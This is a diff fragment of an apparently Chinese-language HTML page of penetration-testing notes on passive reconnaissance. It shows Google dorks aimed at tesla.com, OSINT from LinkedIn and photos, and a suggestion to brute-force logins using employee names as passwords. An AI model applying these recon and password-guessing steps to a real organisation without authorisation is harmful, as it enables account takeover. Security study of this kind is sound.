+<p><img src="/img/passive_Untitled_38.png" alt="Untitled"></p>
 </li>
 </ul>
 </li>
 <li><p>Burp suite Pro 才有主動掃描功能</p>
-<p><img src="img/passive_Untitled_39.png" alt="Untitled"></p>
+<p><img src="/img/passive_Untitled_39.png" alt="Untitled"></p>
 </li>
 </ul>
 </li>
@@ -3473,7 +3706,7 @@ tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png" alt=""
 </li>
 <li><p>查詢該網域下有的指定類型內容</p>
   <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">site:tesla.com filetype:docx</span><br></pre></td></tr></table></figure>
-<p>  <img src="img/passive_Untitled_40.png" alt="Untitled"></p>
+<p>  <img src="/img/passive_Untitled_40.png" alt="Untitled"></p>
 </li>
 <li><p>搜尋快取頁面</p>
   <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cache:tesla.com</span><br></pre></td></tr></table></figure>
@@ -3550,7 +3783,7 @@ tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png" alt=""
 <h3 id="Utilizing-Social-Media"><a href="#Utilizing-Social-Media" class="headerlink" title="Utilizing Social Media"></a><strong>Utilizing Social Media</strong></h3><p>利用社交媒體，查看目標相關資訊</p>
 <ul>
 <li><p><a target="_blank" rel="noopener" href="https://www.linkedin.com/company/tesla-motors/">https://www.linkedin.com/company/tesla-motors/</a></p>
-<p>  <img src="img/passive_Untitled_41.png" alt="Untitled"></p>
+<p>  <img src="/img/passive_Untitled_41.png" alt="Untitled"></p>
 </li>
 <li><p>從照片中看到人事物，都是值得做資料蒐集的對象</p>
 </li>
@@ -3558,7 +3791,7 @@ tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png" alt=""
 <ul>
 <li>透過人員資訊，也許幾萬名員工中有人密碼是弱密碼</li>
 <li><p>可以利用這些資訊進行帳密爆破 &gt; 人員名稱當作密碼..</p>
-<p>  <img src="img/passive_Untitled_42.png" alt="Untitled"></p>
+<p>  <img src="/img/passive_Untitled_42.png" alt="Untitled"></p>
 </li>
 </ul>
 </li>
